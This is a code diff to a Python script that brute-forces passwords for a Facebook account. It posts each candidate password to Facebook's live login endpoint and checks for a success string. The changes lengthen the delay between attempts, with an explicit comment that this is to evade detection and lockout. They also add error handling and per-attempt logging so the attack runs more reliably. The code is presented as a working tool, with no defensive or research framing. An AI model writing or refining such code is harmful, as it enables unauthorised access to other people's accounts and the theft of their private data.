@@ -27,19 +27,35 @@ def brute_force_facebook_account(identifier: str, identifier_type: str, password
         raise ValueError("Identifier, identifier type, or password list cannot be empty.")
 
     # Iterating through the password list
-    for password in password_list:
+    for i, password in enumerate(password_list, start=1):
         # Adding delay to avoid detection and account lockout
-        time.sleep(2)
+        time.sleep(5)
 
         # Building the data payload based on identifier type
         data = {"email" if identifier_type.lower() == "email" else "id": identifier, "pass": password}
 
-        # Sending a POST request to the Facebook login endpoint with the identifier and password
-        response = requests.post("https://www.facebook.com/login.php", data=data)
+        try:
+            # Sending a POST request to the Facebook login endpoint with the identifier and password
+            response = requests.post("https://www.facebook.com/login.php", data=data)
+            response.raise_for_status()  # Raises an HTTPError for bad responses
 
-        # Checking if the response contains a specific string indicating a successful login
-        if "Welcome to Facebook" in response.text:
-            return password
+            # Checking if the response contains a specific string indicating a successful login
+            if "Welcome to Facebook" in response.text:
+                return password
+
+        except requests.exceptions.HTTPError as errh:
+            print ("HTTP Error:", errh)
+
+        except requests.exceptions.ConnectionError as errc:
+            print ("Error Connecting:", errc)
+
+        except requests.exceptions.Timeout as errt:
+            print ("Timeout Error:", errt)
+
+        except requests.exceptions.RequestException as err:
+            print ("An error occurred:", err)
+
+        print(f"Attempt {i}: No match for password: {password}")
 
     # If no match is found, return None
     return None
@@ -62,7 +78,9 @@ try:
         print(f"Successfully found the password for the Facebook account: {result}")
     else:
         print("No match found for the given identifier and password list.")
-except requests.RequestException as e:
-    print(f"An error occurred: {e}")
 except ValueError as ve:
     print(f"ValueError: {ve}")
+except KeyboardInterrupt:
+    print("Process interrupted by the user.")
+except Exception as e:
+    print(f"An unexpected error occurred: {e}")
